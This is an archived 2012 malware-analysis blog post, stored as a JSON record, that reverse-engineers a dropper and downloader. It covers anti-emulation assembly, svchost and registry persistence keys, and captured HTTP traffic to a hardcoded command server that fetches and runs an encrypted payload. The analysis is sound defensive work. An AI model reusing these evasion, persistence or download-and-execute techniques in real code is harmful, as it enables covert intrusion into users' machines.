{
    "id": "775dd8f7-d7fe-4819-a25c-4b2294dfe6b1",
    "created_at": "2023-01-12T15:06:29.119508Z",
    "updated_at": "2025-03-27T02:05:53.419063Z",
    "deleted_at": null,
    "sha1_hash": "33c82a1e640c98305b16c8cd8d6acfe3d1e4d347",
    "title": "2012-12-15 - Disclosure of another 0day malware - Initial Dropper and Downloader (Part 1)",
    "authors": "",
    "file_creation_date": "2022-05-28T17:49:42Z",
    "file_modification_date": "2022-05-28T17:49:42Z",
    "file_size": 650732,
    "plain_text": "# Disclosure of another 0day malware - Initial Dropper and Downloader (Part 1)\n\n**[malware-reversing.com/2012/12/3-disclosure-of-another-0day-malware.html](http://www.malware-reversing.com/2012/12/3-disclosure-of-another-0day-malware.html)**\n\n[R136a1](https://www.blogger.com/profile/07912616682352437666) [December 15, 2012](https://www.malware-reversing.com/2012/12/3-disclosure-of-another-0day-malware.html) [No comments](https://www.malware-reversing.com/2012/12/3-disclosure-of-another-0day-malware.html#comment-form)\n\nIn this series I have analyzed an interesting malware that combines various techniques I haven't seen\nbefore. Part 1 of this series deals with the initial Dropper and the Downloader which both come in the\nform of a Dynamic Link Library (.dll). The initial Dropper drops and executes the Downloader\n(netids.dll). Part 2 deals with the downloaded file, which is just another Dropper (msmvs.exe). This\nDropper drops a .dll (conhost.dll) which in turn drops the final Payload (also .dll). Part 3 deals with the\nfinal Payload (netui.dll). Note: Due to lack of time (and interest), I haven't completely analyzed the final\nPayload.\n\nFigure 1: Overview of the malware components\n\n\n-----\n\nI don't know how the initial Dropper will be delievered to the victim, because a .dll in some way has to\nbe loaded (Export function call, rundll32.exe, ...). Some reports on ThreatExpert indicate that the\nDropper is executed with the help of an exploit (Adobe Acrobat, Microsoft Word):\n\n[http://threatexpert.com/reports.aspx?find=netids.dll&x=10&y=12 (Note: Sometimes Threatexpert](http://threatexpert.com/reports.aspx?find=netids.dll&x=10&y=12)\ndoesn't work)\n\nMaybe the malware is used for a targeted attack in a spearfishing campaign. I also have found a\nSymantec report from 2011 mentioning some behaviours of the .dll, but it seems the one I have\nanalyzed is a newer version of the malware family:\n\n[http://www.symantec.com/security_response/writeup.jsp?docid=2011-090714-2907-99&tabid=3](http://www.symantec.com/security_response/writeup.jsp?docid=2011-090714-2907-99&tabid=3)\n\n**What makes this malware interesting:**\n\n- It makes use of an unknown (AV) Anti-Emulation technique\n\n- Contains Anti-Debugging and Anti-Reversing techniques\n\n- Suspicious strings and the payloads are encrypted\n\n- Suspicious Windows API functions are dynamically resolved\n\n- Downloader and final Payload are (also) implemented as a Windows Service\n\n- Uses multiple encryption techniques (e.g. RC5/6)\n\n- Uses the \"Common Gateway Interface\" (cgi) for data transfers\n\n- Supports Unicode encoding\n\nThe malware was coded in C/C++ programming language with inline Assembly, is written very well,\nuses several \"advanced\" encryption schemes (compared to the usual suspects) and the hardcoded IP\naddresses to the Servers leads, among others, to hosting providers in Panama (see Appendixes for\nwhois information).\n\nBecause the malware is designed to look as legit as possible, the detection rates at time of this writing\n(2 months ago) are very low. The Dropper is detected by only 2/43 AV engines and the Downloader by\nonly 4/43:\n\n**(Initial) Dropper**\nSample: sample.dll\nSize: 41.472 Bytes\nTimestamp: 19.07.2012 10:15:53\nMD5: D4E99548832B6999F00E8D223C6FABBD\nhttps://www.virustotal.com/file/d5debe5d88e76a409b9bc3f69a02a7497d333934d66f6aaa30eb22e45b\n81a9ab/analysis/\n\n**Downloader**\nSample: netids.dll\nSize: 11.776 Bytes\nTimestamp: 17.05.2012 08:24:42\nMD5: CCAB60D3B6AA5FA0C23A5AE59EABCF54\nhttps://www.virustotal.com/file/4a9efdfa479c8092fefee182eb7d285de23340e29e6966f1a7302a765037\n99a2/analysis/\n\n\n-----\n\n**The Initial Dropper**\n\nSo let's start to examine the initial Dropper. A view with a Hexeditor shows the Rich Header, so a\nMicrosoft Compiler was used to build the .dll. We also see a lot of C++ runtime strings and messages\nwhich show the file was coded in C/C++. Thereafter we see the Import Table with some interesting API\nfunctions, e.g. for creating a Windows Service (OpenSCManager, CreateService, ...). There follows\nthe export information with only one function (\"Start\"). At last we can see some Unicode strings which\nare later used for Service creation:\n\nNetwork Identification Service\nntsvcs\nsoftware\\microsoft\\windowsnt\\currentversion\\svchost\nServiceDllUnloadOnStop\nServiceDll\nparameters\nsystem\\currentcontrolset\\services\\Network Identification Service\nCoInitializeSecurityParam\nsoftware\\microsoft\\windows nt\\currentversion\\svchost\\ntsvcs\nService for network identification control data\\svchost.exe -k ntsvcs\n\nAfter viewing the hexadecimal output we open our Resource-Editor and see the only resource is \"B\" ->\n\"284\". The resource's size is 11.776 Bytes and looks like random data.\n\nLet's start to do a further analysis and take a look into the code of this malware. We open up IDA Pro,\nload the .dll and land in the DllMain routine. If we take a look at the \"Exports\" we see, beside the\nDllEntryPoint function (which every Dll has, because of the needed Entrypoint), the only exported\nfunction is \"Start\". But before we examine this routine, let's take a quick look at the \"Functions\". We\nsee a lot of C++ runtime functions, a few Windows API functions and two functions which look like\nEntrypoints (DllEntrypoint, DllMain). What is the real Entrypoint?\n\nA .dll build with a Microsoft C++ compiler and the C/c++ run-time library looks like it has 2\n\"Entrypoints\". The function _DllMainCRTStartup (in IDA Pro named DllEntrypoint) does some internal\nruntime stuff and calls DllMain (http://msdn.microsoft.com/enus/library/aa295784%28v=vs.60%29.aspx). So we can skip the DllEntrypoint function and take a look\ninto DllMain (what IDA Pro showed us on beginning). The only interesting operation in DllMain is the\nstorage of the handle to the DLL module in a global variable for later use. Now let's take a look into the\nStart() function.\n\nAt the beginning two MMX instructions (movd, pslld) are executed to throw out AntiVirus Emulators:\n\nmov   [ebp+var_20], 54AF97E1h\nmovd  mm0, [ebp+var_20]\npslld  mm0, 2\nmovd  [ebp+var_20], mm0\n\n\n-----\n\nFigure 2: Anti Emulation code\n\nAn exception, which occurs if this instructions aren't handled correctly is catched by the malware and\nthe .dll exits without doing anything. Next, a function is called which decrypts a bunch of strings, .dll\nnames and function names in the .data section which are then used for subsequent operations:\n\n{0B115951-84FD-43E7-A2D8-F3C4D36F4BEA}\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\nThreadingModel\nApartment\nSoftware\\Classes\\CLSID\\%s\\InProcServer32\nNetIDS\n\\mscsv.tmp\n\\netids.dll\n\\els.dll\nkernel32.dll\nGetProcessHeap\nGetSystemDirectoryA\nlstrcatA\nCreateFileA\nGetSystemTime\nSystemTimeToFileTime\nGetFileTime\nCloseHandle\nFindResourceA\nLoadResource\nLockResource\nSizeofResource\nGetFileAttributesA\nMoveFileExA\nWriteFile\nSetFileTime\nADVAPI32.dll\nRegCreateKeyA\nRegSetValueExA\n\n\n-----\n\nRegCloseKey\nRegOpenKeyA\nMSVCRT.dll\nsprintf\nshell32.dll\nSHGetFolderPathA\nRUNDLL32.EXE \"%s\",Init1.Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\nWith the help of LoadLibrary() and GetProcAddress() some of the decrypted API functions then get\ndynamically resolved. Thereafter the malware gets the OS version (MajorVersion, MinorVersion) and\nstores it for the installation part. Then the resource section is loaded into memory and decrypted with\nthe same decryption routine as before. Now we can see the resource section is another PE file (the\nDownloader). There follows the installation of the decrypted PE file.\n\nFigure 3: Overview of the Initial Dropper\n\nThe installation part first looks for the file time of \"els.dll\" (Windows Event Viewer Snapin) which\nresides in Windows's system folder (Windows XP SP3) and stores it. If the file \"els.dll\" isn't found, the\nmalware acquires the system time and converts it to file time format (SystemTimeToFileTime()).\nThereafter it checks on which Windows OS version it is executed and acts accordingly:\n\n**Windows prior to Vista (e.g. Windows XP)**\nThe decrypted file from resource section (Downloader) is written to system directory as \"netids.dll\".\nThen the file's time is set to one of the above received times. To ensure startup persistency on the\nsystem the malware creates the Windows Service \"Network Identification Service\" (Description:\n\"Service for network identification control data\") with binary path \"C:\\WINDOWS\\system32\\svchost.exe\n-k ntsvcs\". Then it registers the Windows Service \"ntsvcs\" in the Service Control Manager (SCM)\ndatabase by creating the following registry keys:\n\n\n-----\n\nHKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\svchost\\ntsvcs\n|-> CoInitializeSecurityParam = 0x00000001\n\nHKEY_LOCAL_MACHINE\\system\\currentcontrolset\\services\\Network Identification Service\n|-> parameters\nValue: ServiceDll = C:\\WINDOWS\\system32\\netids.dll\nValue: ServiceDllUnloadOnStop = 0x00000001\n\nHKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\svchost\\ntsvcs\nValue: ntsvcs = Network Identification Service\n\nThis way the malware looks like a legit application and it kills two birds with one stone. By indirectly\ninjecting the dll into SvcHost the binary path of the Windows Service \"Network Identification Service\"\njust shows \"C:\\WINDOWS\\system32\\svchost.exe -k ntsvcs\", nothing that looks suspicious at first. And\nby using the svchost.exe process for sending all the network traffic, it doesn't look suspicious at first as\nwell, because svchost.exe normally produces network traffic. Also svchost.exe is often a trusted\nprocess in desktop firewall rules so it should bypass most of them. If for some reason the above\nregistry creations are failing, the malware creates a COM object and registers it in the shell:\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{0B115951-84FD-43E7-A2D8F3C4D36F4BEA}\n|-> InProcServer32 = C:\\WINDOWS\\system32\\netids.dll\nValue: ThreadingModel = Apartment\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\nValue: NetIDS = {0B115951-84FD-43E7-A2D8-F3C4D36F4BEA}\n\nChosing this way, the malware is started by Explorer.exe on Windows startup, because Explorer.exe is\nthe shell for Windows.\n\n**Windows Vista and above (e.g. Windows 7)**\nThe file's installation folder is get with help of SHGetFolderPath() function (CSIDL_FLAG_CREATE +\nCSIDL_LOCAL_APPDATA). Into this hidden folder (C:\\Documents and Settings\\<User>\\Local\nSettings\\Application Data) the file \"netids.dll\" is written and then the following registry key is created to\nensure startup persistency when the user logs in:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nValue: NetIDS = RUNDLL32.EXE \"C:\\Documents and Settings\\<User>\\Local Settings\\Application\nData\\netids.dll\",Init1\n\nThat's the whole functionality of the Dropper, so let's move on to the Downloader.\n\n**The Downloader (netids.dll)**\n\nAccording to which startup/installation method is used, the Downloader starts in different ways. We\ncan summarize the \"Explorer.exe\" and \"Windows Vista and above\" startup routines into one\ndescription, because the exported function \"Init1\" which is called on \"Windows Vista and above\"\nstartup method just waits for completion of DllMain() function (WaitForSingleObject()).\n\n\n-----\n\nSo we have the first startup routine which is the calling of DllMain() ( Explorer.exe + Windows Vista\nand above\") and the other (Windows Service) which is calling ServiceMain(). What both have in\ncommon is the creation of a main Thread with all the Downloader's functionality, but let's see...\n\n**DllMain() startup method**\nThis method decrypts strings, function names and .dll names as we saw in the initial Dropper for\nsubsequent use. The decryption routine is different than the one used in the initial Dropper. With the\ndecrypted function and .dll names the malware then resolves some API function addresses and uses it\nto create the main Thread.\n\n**ServiceMain() startup method**\nStarts with the registration of the Service Control Handler (RegisterServiceCtrlHandlerEx()). The\nService Control Handler handles SERVICE_CONTROL_STOP,\nSERVICE_CONTROL_INTERROGATE and SERVICE_CONTROL_SHUTDOWN control codes and\nsets the appropriate elements of SERVICE_STATUS structure (SetServiceStatus()). Then it also\ncreates the main Thread and executes it.\n\n**Main Thread**\n\nThe main Thread first calls the same Anti Emulation technique as the initial Dropper. Thereafter a\nbunch of API function addresses are resolved with help of LoadLibrary() and GetProcAddress(). To\ndecrypt additional data the decryption function is called another time. Now the malware gets the\nVolume Serial Number, the Computer Name, the OS Version (Major, Minor) and stores it in a string of\nthe following format for later use:\n\n<ComputerName><VolumeSerialNumber>-<OSMajorVersion>_<OSMinorVersion>\n\nNext, a sub-Thread is created which handles the main tasks of the malware (see below). There follows\nthe sending of an initialization message to the Server with content \"T0s=\" (Base64 encoded \"OK\"\nstring) in the following format:\n\nPOST /~wong/cgi-bin/brvc.cgi?<ComputerName><VolumeSerialNumber><OSMajorVersion>_<OSMinorVersion>\n\nThe \"brvc.cgi\" script/program is used for processing status messages (as we will see also later). If for\nsome reason the sending of the initialization message failed, the main Thread sleeps for 5 minutes\nand then tries again to send the message. As you can see, the message is send with HTTP POST\nrequest method and is Base64 encrypted with the help of CryptBinaryToString() function. For network\ncommunication the Downloader uses the \"Common Gateway Interface\"\n[(https://en.wikipedia.org/wiki/Common_Gateway_Interface). With the Common Gateway Interface a](https://en.wikipedia.org/wiki/Common_Gateway_Interface)\nclient (normally a browser, in our case the malware) can send data as part of the HTTP request\n(POST/GET method) that gets processed on the Server with help of a program/script. This\nprogram/script is executed on the Server by the HTTP daemon (httpd) and can be coded in any\nlanguage (C, Perl, Python, ...) as long as it is able read from the standard input, write to the standard\noutput and has access to environment variables.\n\nThat's all the functionality of the main Thread, let's continue with the sub-Thread.\n\n**Sub-Thread**\n\n\n-----\n\nAt first it checks if a network conection is available (InternetGetConnectedState()). If this is the case it\nconnects to the Server 200.106.145.122 (InternetOpen() + InternetConnect()) with User-Agent \"MSIE\n8.0\".\n\nFigure 4: Malware's network traffic to the Server and back\n\nIn the following paragraph I will examine the HTTP network session between the Downloader and the\nServer that I have captured with Wireshark during the first dynamic analysis:\n\n**Contacting 200.106.145.122:**\nGET /~wong/cgi-bin/sptr.cgi?<ComputerName><VolumeSerialNumber><OSMajorVersion>_<OSMinorVersion>\nUser-Agent: MSIE 8.0\nSource Port: 1027\n\n**-> HTTP 200 OK**\n\n**Contacting 200.106.145.122:**\nGET /~wong/cgi-bin/sptr.cgi?<ComputerName><VolumeSerialNumber><OSMajorVersion>_<OSMinorVersion>\nUser-Agent: MSIE 8.0\nSource Port: 1028\n\n**-> HTTP 200 OK**\n\n**Contacting 200.106.145.122:**\nGET /~wong/cgi-bin/sptr.cgi?<ComputerName><VolumeSerialNumber><OSMajorVersion>_<OSMinorVersion>\n\n\n-----\n\nUser-Agent: MSIE 8.0\nSource Port: 1029\n\n**-> HTTP 200 OK**\nData: 20121009_12:33:12.bin.<ComputerName><VolumeSerialNumber><OSMajorVersion>_<OSMinorVersion>\n\nAs you can see the Downloader sends 3 HTTP GET requests to the Server to query any data\navailable (InternetQueryDataAvailable() + InternetReadFile()). The request has the following form:\n\nGET /~wong/cgi-bin/sptr.cgi?<ComputerName><VolumeSerialNumber><OSMajorVersion>_<OSMinorVersion>\n\nThe \"sptr.cgi\" script/pogram is used for initializing a transmission of encrypted data (strings or PE file).\nAfter the third request, a HTTP 200 OK response with a string is send back to the Downloader. I guess\nit takes 3 times, because the malware guy has to give his OK manually, but that's just speculation.\nDuring the 3 requests the Thread sleeps for 5 minutes and then again contacts the Server. The string\nfrom the response is then used to build the next HTTP GET request:\n\n**Contacting 200.106.145.122:**\nGET /~wong/cgi-bin/qfa.cgi?20121009_12:33:12.bin.<ComputerName><VolumeSerialNumber><OSMajorVersion>_<OSMinorVersion>\nUser-Agent: MSIE 8.0\nSource Port: 1030\n\n**-> HTTP 200 OK**\nData: IAAAAGaj4H0Wq71JzmZRJ9chlqCr+6tYjrBSicQg12cXWOhXlk4ZTwhYo74= (Base64 + RC5/6\n+ Custom Encoding -> \"200.106.145.122\", \"wong\", \"FFFFFFFFFS\")\n\nThe \"qfa.cgi\" script/program processes all file queries (I guess \"qfa\" means \"query file available\") and\nsends a HTTP 200 OK response with Base64 encoded and encrypted data. The data then gets\ndecrypted in memory and used for the subsequent HTTP requests. I think the first HTTP request to\n\"qfa.cgi\" is used to get the Server and folder where the file to be downloaded can be found. During the\nstatic analysis I haven't completely understood the decryption scheme (RC5/6 + Custom) by just\nreading the disassembly (I'm not a crypto guy). I tried to debug and patch the Downloader to feed the\nappropriate decryption functions with the catched data, but it isn't a trivial task to do that with a\nmultithreaded dll in OllyDbg (1.10). For example I encountered a strange problem by stepping over\none of the Windows API functions used by the malware (see\n[http://www.kernelmode.info/forum/viewtopic.php?f=13&t=1915). Fortunately the new OllyDbg (2.01)](http://www.kernelmode.info/forum/viewtopic.php?f=13&t=1915)\nhas some improvements in debugging multithreaded applications. So I finally was able to at least see\nthe decrypted data in memory without understanding the decryption code.\nThis was possible, because as part of this analysis I have emulated the original web Server by setting\n[up a local Apache web Server (Xampp), coded 3 simple Perl CGI scripts (sptr.cgi, qfa.cgi, mpk.cgi)](http://www.apachefriends.org/de/xampp.html)\nand patched the malware, so it contacts the local web Server instead of the original. With the new\nOllyDbg my breakpoints on the Threads to be created where finally hit, so I could have watched the\ndecryption buffers to see the decrypted data. Unfortunately on the dynamic analysis (monitoring\nnetwork traffic, ...) I was too noisy by accidently using \"R136a1\" as my Virtual Machine's Windows\ncomputer name which gets send to the Server. It seems that the malware guy(s) found my Blog and\n\n\n-----\n\nblocked any future contacting attempts from me respectively it looks they set the Server into a sleep\nmodus by stopping all responses (I changed the computer name, the volume serial number and my IP,\nbut no luck). But it doesn't matter since I catched most of the interesting information and the\ndownloaded components for a further analysis. Interestingly I noticed an increasing number of visitors\nfrom Malaysia and the Netherlands on my Blog after I executed and monitored the malware for the first\ntime. But let's continue with the network traffic:\n\n**Contacting 200.106.145.122:**\nGET /~wong/cgi-bin/mpk.cgi?20121009_12:33:12.bin.R136A11a6b3478-05_01\nUser-Agent: MSIE 8.0\nSource Port: 1031\n\n**-> HTTP 200 OK**\nData: 20121009_12:33:12.bin.<ComputerName><VolumeSerialNumber><OSMajorVersion>_<OSMinorVersion>\n\nThe \"mpk.cgi\" script/program is requested to actually iniciate a binary download. After the HTTP GET\nrequest to mpk.cgi, the before decrypted strings (\"200.106.145.122\", \"wong\", \"FFFFFFFFFS\") are\nused to form the final request for the encrypted file download:\n\n**Contacting 200.106.145.122:**\nGET /~wong/cgi-bin/sptr.cgi?FFFFFFFFFS\nUser-Agent: MSIE 8.0\nSource Port: 1032\n\n**-> HTTP 200 OK**\nData: 20120517_08:28:08.bin.FFFFFFFFFS\n\nThere follows again the HTTP GET request to \"qfa.cgi\" with string \"FFFFFFFFFS\" as part of the data.\nNow the additional component is send back as encoded (Base64) and encrypted (RC5/6 + Custom)\ndata. This PE file is then again decrypted with the same functions as above:\n\n**Contacting 200.106.145.122:**\nGET /~wong/cgi-bin/qfa.cgi?20120517_08:28:08.bin.FFFFFFFFFS\nUser-Agent: MSIE 8.0\nSource Port: 1033\n\n**-> HTTP 200 OK**\nData: BDoBADy5kkfXzunIxmBHpWXqIbkBvfjBcprXJ3bfvi9MXf353W/d5QaDi0AVoQAqnj5QVBrB3ozO\njn1PlsI7t32bxvNhYO8BBv+QMAjdopkyumz+nYDn1jncyhtNN1/LoKZSkeZvtCTJv/gHqbf/yBDZ\n....\n....\nGgwIvEY5dm4PTUsSyTJYXxesNDcIq8qq3IEulCFDO0FwjVAcR/qcn7+h (Base64 + RC5/6 + Custom\nEncoding -> Dropped PE File)\n\nAfter the file is decrypted, the installation procedure begins by comparing the sended string\n\"FFFFFFFFFS\" with the hardcoded string \"FFFFFFFFFX\". If they match, the downloaded and\ndecrypted file is executed in memory without touching the disk. This is done by changing the file's\naccess protection attributes of committed pages in virtual address space to\n\n\n-----\n\nPAGE_EXECUTE_READWRITE (VirtualProtect()) so the it can be executed as a new Thread\n(CreateThread()). If they don't match, the file is written to disk as \"msmvs.exe\" (CreateFile() +\nWriteFile()), executed (CreateProcess()) and finally deleted (DeleteFile()). The installation directory is\neither the Windows temporary folder (GetTempPath()), if that fails the file is written into the Windows\nfolder (GetWindowsDirectory()). Thereafter the malware tries to load a .dll that is to be dropped by the\ndownloaded file (msmvs.exe) with help of LoadLibrary() function.\n\nAt last two status messages are send again by using HTTP POST method to the script/porgram\n\"brvc.cgi\":\n\n**Contacting 200.106.145.122:**\nPOST /~wong/cgi-bin/brvc.cgi?<ComputerName><VolumeSerialNumber><OSMajorVersion>_<OSMinorVersion>\nUser-Agent: MSIE 8.0\nSource Port: 1034\nData: aW5zOjAwMDAwMDAw (Base64 -> \"ins:00000000\")\n\n**-> HTTP 200 OK**\n\n**Contacting 200.106.145.122:**\nPOST /~wong/cgi-bin/brvc.cgi?<ComputerName><VolumeSerialNumber><OSMajorVersion>_<OSMinorVersion>\nUser-Agent: MSIE 8.0\nSource Port: 1035\nData: ZGxsOjAwMDAwMDdl (Base64 -> \"dll:0000007e\")\n\n**-> HTTP 200 OK**\n\nThe string \"ins:00000000\" tells the malware guy(s) that the execution/installation of the downloaded\nfile was successful without any errors. The string \"dll:0000007e\" tells him that the dropped .dll from the\ndownloaded file (msmvs.exe) wasn't loaded successfully (GetLastError() -> 0x0000007e). In my case\nthe .dll wasn't loaded because it wasn't there at time of debugging.\n\nThat's it. We have analyzed the functionality of the initial Dropper and the Downloader. In the next Part\nwe examine the downloaded file (another Dropper) and the dropped file (yet another Dropper).\n\n**Appendix**\n\n**Whois for 200.106.145.122:**\n\nIP location:    Panama Panama Hosting Panama\nASN:        AS27990\nIP Address:    200.106.145.122\n\nNetRange:    200.0.0.0 - 200.255.255.255\nCIDR:      200.0.0.0/8\nOriginAS:\nNetName:    LACNIC-200\nNetHandle:   NET-200-0-0-0-1\n\n\n-----\n\nParent:\nNetType:    Allocated to LACNIC\nComment:    This IP address range is under LACNIC responsibility for further\nComment:    allocations to users in LACNIC region.\nComment:    Please see http://www.lacnic.net/ for further details, or check the\nComment:    WHOIS server located at http://whois.lacnic.net\nRegDate:    2002-07-27\nUpdated:    2010-07-21\nRef:      http://whois.arin.net/rest/net/NET-200-0-0-0-1\n\nOrgName:    Latin American and Caribbean IP address Regional Registry\nOrgId:     LACNIC\nAddress:    Rambla Republica de Mexico 6125\nCity:      Montevideo\nStateProv:\nPostalCode:   11400\nCountry:    UY\nRegDate:    2002-07-27\nUpdated:    2011-09-24\nRef:      http://whois.arin.net/rest/org/LACNIC\n\nReferralServer: whois://whois.lacnic.net\n\nOrgAbuseHandle: LACNIC-ARIN\nOrgAbuseName:  LACNIC Whois Info\nOrgAbusePhone: 999-999-9999\nOrgAbuseEmail: whois-contact@lacnic.net\nOrgAbuseRef:  http://whois.arin.net/rest/poc/LACNIC-ARIN\n\nOrgTechHandle: LACNIC-ARIN\nOrgTechName:  LACNIC Whois Info\nOrgTechPhone:  999-999-9999\nOrgTechEmail:  whois-contact@lacnic.net\nOrgTechRef:   http://whois.arin.net/rest/poc/LACNIC-ARIN\n\n== Additional Information From whois://whois.lacnic.net ==\n\ninetnum:    200.106.144/21\nstatus:    allocated\naut-num:    N/A\nowner:     Hosting Panama\nownerid:    PA-HOPA1-LACNIC\nresponsible:  Network Operations Center\naddress:    WTC, 0832,\naddress:    08322657 - Panama - PA\ncountry:    PA\nphone:     +50 7 2000100 [147]\nowner-c:    NOS10\n\n\n-----\n\ntech-c:    NOR4\nabuse-c:    NOS10\ninetrev:    200.106.145/24\nnserver:    NS1.PA-DNS.COM\nnsstat:    20121101 AA\nnslastaa:   20121101\nnserver:    NS2.PA-DNS.COM\nnsstat:    20121101 AA\nnslastaa:   20121101\ncreated:    20090303\nchanged:    20100121\n\nnic-hdl:    NOR4\nperson:    Network Operations Center - RS\ne-mail:    noc-rs@panamahosting.com\naddress:    Boulevard El Dorado, CC Camino de Cruces M3, 0, 0819-01424\naddress:    0 - Panama - PA\ncountry:    PA\nphone:     +507 226 4678 []\ncreated:    20100121\nchanged:    20100121\n\nnic-hdl:    NOS10\nperson:    Network Operations Center - SS\ne-mail:    noc-ss@panamahosting.com\naddress:    Boulevard El Dorado, CC Camino de Cruces M3, 0, 0819-01424\naddress:    0 - Panama - PA\ncountry:    PA\nphone:     +507 226 4678 []\ncreated:    20100121\nchanged:    20100121\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2012/2012-12-15 - Disclosure of another 0day malware - Initial Dropper and Downloader (Part 1).pdf"
    ],
    "report_names": [
        "2012-12-15 - Disclosure of another 0day malware - Initial Dropper and Downloader (Part 1).pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535989,
    "ts_updated_at": 1743041153,
    "ts_creation_date": 1653760182,
    "ts_modification_date": 1653760182,
    "files": {
        "pdf": "https://archive.orkl.eu/33c82a1e640c98305b16c8cd8d6acfe3d1e4d347.pdf",
        "text": "https://archive.orkl.eu/33c82a1e640c98305b16c8cd8d6acfe3d1e4d347.txt",
        "img": "https://archive.orkl.eu/33c82a1e640c98305b16c8cd8d6acfe3d1e4d347.jpg"
    }
}